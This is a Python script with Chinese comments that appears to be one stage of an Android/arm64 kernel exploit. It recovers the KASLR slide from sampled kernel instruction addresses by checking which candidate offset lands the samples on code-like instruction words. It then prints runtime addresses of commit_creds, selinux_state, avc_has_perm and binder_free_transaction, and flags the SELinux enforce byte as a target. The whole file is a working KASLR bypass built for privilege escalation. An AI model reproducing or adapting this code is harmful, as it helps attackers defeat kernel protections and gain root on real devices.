#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""solve_slide2.py —— 用"指令是否像代码"来精确解 KASLR slide（取代恒真的符号区间判据）。

为什么上一版错: 内核 text 里符号区间**首尾相接铺满**, 所以"每个样本都落在某符号区间内"
  等价于"落在 [_stext,_etext] 窗口内" ⇒ 对几乎所有 s 都成立 ⇒ 两次采集解出相差 42KB 的 s 却都"通过"。
这一版: 从镜像 text 里统计**实际出现过的 A64 顶层指令类** (word>>26 的 6 位) 当作"代码词表",
  再要求候选 s 让**尽可能多**的样本在 (a-s) 处命中该词表且字非 0。
  随机 s 的单样本通过率约 50~65%, 60 个独立样本同时通过的期望 ≈ 1e-14 ⇒ 唯一解。
用法: python solve_slide2.py <kallsyms.txt> <ips.txt> <kernel.bin> [样本数]
"""
import io, re, sys
import numpy as np

KS, IPS, IMG = sys.argv[1], sys.argv[2], sys.argv[3]
NSAMP = int(sys.argv[4]) if len(sys.argv) > 4 else 60

syms = []
for line in io.open(KS, encoding='utf-8', errors='replace'):
    p = line.split()
    if len(p) >= 3 and re.fullmatch(r'[0-9a-f]{16}', p[0]):
        syms.append((int(p[0], 16), p[2]))
syms.sort()
d = {}
for a, n in syms: d.setdefault(n, a)
T0, T1 = d['_stext'], d['_etext']

img = io.open(IMG, 'rb').read()
W = np.frombuffer(img, dtype='<u4')                       # 镜像按 4 字节字看
base = 0xffffffc010080000                                  # 文件偏移 0 对应的链接期地址
if W.size * 4 < T1 - base:
    raise SystemExit("镜像太短")

# 1) 从 text 里建"代码词表"
t0 = (T0 - base) // 4
t1 = (T1 - base) // 4
text_words = W[t0:t1]
vocab = set((text_words >> 26).astype(np.uint32).tolist())
frac_nonzero = float((text_words != 0).mean())
print("text 字数=%d  词表大小=%d/64  非零字比例=%.3f" % (text_words.size, len(vocab), frac_nonzero))

# 2) 样本: 先按 4MB 间隔聚簇, 取最大簇(核心 text 应当是一个大簇)
obs = np.array(sorted(int(l.split()[1], 16) for l in io.open(IPS, encoding='utf-8') if l.startswith('k ')),
               dtype=np.uint64)
gaps = np.diff(obs)
brk = np.flatnonzero(gaps > (4 << 20)) + 1
parts = np.split(obs, brk)
C = max(parts, key=len)
print("簇: 共 %d 个, 最大簇 n=%d 跨度=0x%x (%.1f MB)" %
      (len(parts), len(C), int(C[-1] - C[0]), (int(C[-1]) - int(C[0])) / 2**20))

# 3) 候选 s 窗口: 该簇所有样本都要落进 [_stext,_etext)
smin = int(C.max()) - (T1 - 4)
smax = int(C.min()) - T0
if smax <= smin:
    raise SystemExit("窗口为空: 簇跨度 %.1f MB > text %.1f MB ⇒ 该簇混了模块, 需要更细的分簇"
                     % ((int(C.max()) - int(C.min())) / 2**20, (T1 - T0) / 2**20))
cands = np.arange(smin, smax + 1, 4, dtype=np.int64)
print("候选 s 个数=%d (窗口 %.2f MB)" % (cands.size, (smax - smin) / 2**20))

vset = np.zeros(64, dtype=bool)
for v in vocab: vset[v] = True

score = np.zeros(cands.size, dtype=np.int32)
# 注意: 内核地址 > 2**63, 绝不能 astype(np.int64) —— 会变负数然后溢出
idxs = np.random.default_rng(7).choice(C.size, size=min(NSAMP, C.size), replace=False)
samp = [int(C[i]) for i in idxs]
for a in samp:
    A = int(a) - base                       # 先做纯整数减法, 避免 numpy 类型提升问题
    idx = (A - cands) >> 2
    ok = (idx >= 0) & (idx < W.size)
    good = np.zeros(cands.size, dtype=bool)
    ii = idx[ok]
    w = W[ii]
    good[ok] = (w != 0) & vset[(w >> 26).astype(np.uint8)]
    score += good.astype(np.int32)

order = np.argsort(-score)
ns = len(samp)
print("前 6 名:")
for k in order[:6]:
    print("   s=0x%012x  通过 %d/%d (%.3f)" % (int(cands[k]), score[k], ns, score[k] / ns))
top = score[order[0]]
win = cands[score >= max(1, top)]
if top >= int(ns * 0.98):
    s = int(cands[order[0]])
    print(">>> slide = 0x%x  (唯一性: 满分候选 %d 个)" % (s, win.size))
    for nm in ('_stext', 'selinux_state', '__bss_start', '__bss_stop', 'commit_creds',
               'avc_has_perm', 'binder_free_transaction', 'remove_waiter', 'acc_fops'):
        if nm in d: print("   %-24s runtime=0x%016x" % (nm, d[nm] + s))
    if 'selinux_state' in d:
        print("   ★ enforce (=selinux_state+1) runtime=0x%016x" % (d['selinux_state'] + s + 1))
    io.open('slide_best.txt', 'w').write("0x%x\n" % s)
else:
    print('=> 没有满分候选(最高 %.3f) / 满分候选 %d 个' % (top / ns, int(win.size)))
